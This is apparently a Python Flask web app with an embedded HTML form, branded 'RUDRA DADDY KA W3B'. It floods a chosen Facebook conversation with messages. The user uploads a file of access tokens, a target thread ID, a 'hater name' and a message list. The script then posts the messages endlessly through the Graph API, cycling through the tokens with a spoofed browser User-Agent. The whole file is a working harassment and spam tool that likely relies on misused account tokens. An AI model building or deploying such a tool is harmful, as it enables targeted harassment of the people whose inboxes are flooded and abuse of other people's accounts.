from flask import Flask, request
import requests
import os
from time import sleep
import time
from datetime import datetime

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_tokens_file = request.files['accessToken']
        access_tokens = access_tokens_file.readlines()
        num_tokens = len(access_tokens)
        convo_id = request.form.get('threadId')
        haters_name = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
        num_messages = len(messages)
        max_tokens = min(num_tokens, num_messages)

        try:
            while True:
                for message_index in range(num_messages):
                    token_index = message_index % max_tokens
                    access_token = access_tokens[token_index].decode().strip()
                    message = haters_name + ' ' + messages[message_index].strip()

                    api_url = f'https://graph.facebook.com/v15.0/t_{convo_id}/'
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, json=parameters, headers=headers)

                    if response.status_code == 200:
                        print("SENDED BY TOKEN {}: {}".format(token_index+1, {message}))
                    else:
                        print(f"Failed  {message}")

                    time.sleep(time_interval)

        except Exception as e:
            print(f"Error while sending message: {e}")
            time.sleep(30)

    return '''
    <!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RUDRA😈DADDY💀KA W3B</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #f8f9fa;
      overflow: hidden; /* Hide overflow to prevent scrolling during animation */
    }

    /* Add blur effect to body */
    body:before {
      content: "";
      position: fixed;
      z-index: -1;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://i.ibb.co/0sr1mVJ/7b7cbc0b-0094-4f2d-959e-d221ea8c1796.jpg') center center;
      background-size: cover;
      filter: blur(8px);
    }

    .container {
      opacity: 0; /* Initially hide container */
      transform: translateY(100%); /* Slide down initially */
      transition: opacity 1s, transform 1s;
    }

    .container.show {
      opacity: 1;
      transform: translateY(0); /* Slide up when shown */
    }

    .header {
      text-align: center;
      padding-bottom: 20px;
    }

    .btn-submit {
      width: 100%;
      margin-top: 10px;
    }

    .footer {
      text-align: center;
      margin-top: 20px;
      color: #888;
    }

    /* Style for white labels */
    label {
    color: white;
    height: 100%;
    display: inline-block; /* Make labels block-level elements */
    width: 200px; /* Set the desired width */
    margin-right: 10px; 
    max-width: 150px; 
    overflow: hidden;
    text-overflow: ellipsis; 
    white-space: nowrap; 
    display: inline-block; 
    margin-bottom: 2px;

    }
  </style>
</head>

<body>
  <header class="header mt-4">
    <h1 class="mb-3"> 𝗦𝗬𝗦𝗧𝗨𝗠𝗠 𝗛𝗘𝗥𝗘 ⒷⓎ 🆁︎🆄︎🅳︎🆁︎🅰︎ 🅹︎🅰︎🅰︎🆃︎😈 </h1>
    <h1 class="mt-3">🅾🆆🅽🅴🆁]|^>>>• 🅁🅄🄳🅁🄰 🄹🄰🄰🅃 </h1>
  </header>

  <div class="container" id="mainContainer">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken">Attach Token File:</label>
        <input type="file" class="form-control" id="accessToken" name="accessToken" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="threadId">Enter Convo/Inbox ID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">Enter Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">Select Your Notepad File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time">Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
    </form>
  </div>
  <footer class="footer">
    <a href="https://facebook.com/61550558518720"><|-/😈🅁🅄🄳🅁🄰 🄹🄰🄰🅃➖😈❤️➖❥</a>
    <p>Keep enjoying</p>
  </footer>

  <script>
    // JavaScript to trigger the animation after the page has loaded
    window.onload = function () {
      document.getElementById('mainContainer').classList.add('show');
    }
  </script>
</body>

</html>

    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
    
    
    
